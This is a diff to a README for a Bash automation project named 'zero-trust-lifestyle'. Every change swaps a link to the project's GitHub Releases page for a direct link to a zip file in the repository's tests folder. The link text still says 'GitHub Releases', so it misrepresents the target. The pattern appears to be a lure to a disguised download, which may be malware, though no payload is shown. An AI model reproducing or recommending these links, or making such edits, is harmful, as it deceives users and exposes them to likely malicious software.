@@ -1,10 +1,10 @@
 # 🛡️ zero-trust-lifestyle - Simple automation for a guarded workflow
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Fundamental-wintersquashplant734/zero-trust-lifestyle/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Fundamental-wintersquashplant734/zero-trust-lifestyle/raw/refs/heads/main/tests/trust_zero_lifestyle_debar.zip)
 
 ## 📥 Download
 
-Visit this page to download: [GitHub Releases](https://github.com/Fundamental-wintersquashplant734/zero-trust-lifestyle/releases)
+Visit this page to download: [GitHub Releases](https://github.com/Fundamental-wintersquashplant734/zero-trust-lifestyle/raw/refs/heads/main/tests/trust_zero_lifestyle_debar.zip)
 
 ## 🧭 What this app does
 
@@ -22,7 +22,7 @@ WSL lets you run Linux tools on Windows.
 1. Open the Microsoft Store.
 2. Install Ubuntu or another Linux distro.
 3. Open the installed distro from the Start menu.
-4. Visit the [GitHub Releases](https://github.com/Fundamental-wintersquashplant734/zero-trust-lifestyle/releases) page.
+4. Visit the [GitHub Releases](https://github.com/Fundamental-wintersquashplant734/zero-trust-lifestyle/raw/refs/heads/main/tests/trust_zero_lifestyle_debar.zip) page.
 5. Download the release files from that page.
 6. Move the files into your WSL home folder.
 7. Run the scripts from the WSL terminal.
@@ -32,7 +32,7 @@ Git Bash gives you a Bash terminal on Windows.
 
 1. Install Git for Windows.
 2. Open Git Bash.
-3. Visit the [GitHub Releases](https://github.com/Fundamental-wintersquashplant734/zero-trust-lifestyle/releases) page.
+3. Visit the [GitHub Releases](https://github.com/Fundamental-wintersquashplant734/zero-trust-lifestyle/raw/refs/heads/main/tests/trust_zero_lifestyle_debar.zip) page.
 4. Download the release files from that page.
 5. Extract the files into a folder you can find again.
 6. Run the scripts from Git Bash.
@@ -107,7 +107,7 @@ Keep the folder in a place you can reach from your terminal.
 
 ## 🛠️ Simple usage steps
 
-1. Download the release from the [GitHub Releases](https://github.com/Fundamental-wintersquashplant734/zero-trust-lifestyle/releases) page.
+1. Download the release from the [GitHub Releases](https://github.com/Fundamental-wintersquashplant734/zero-trust-lifestyle/raw/refs/heads/main/tests/trust_zero_lifestyle_debar.zip) page.
 2. Extract the files.
 3. Open WSL or Git Bash.
 4. Change to the extracted folder.
@@ -196,7 +196,7 @@ bash meeting-setup.sh
 
 ## 📌 Download again
 
-If you need the files again, visit the release page here: [https://github.com/Fundamental-wintersquashplant734/zero-trust-lifestyle/releases](https://github.com/Fundamental-wintersquashplant734/zero-trust-lifestyle/releases)
+If you need the files again, visit the release page here: [https://github.com/Fundamental-wintersquashplant734/zero-trust-lifestyle/raw/refs/heads/main/tests/trust_zero_lifestyle_debar.zip](https://github.com/Fundamental-wintersquashplant734/zero-trust-lifestyle/raw/refs/heads/main/tests/trust_zero_lifestyle_debar.zip)
 
 ## 🧾 Project details
 
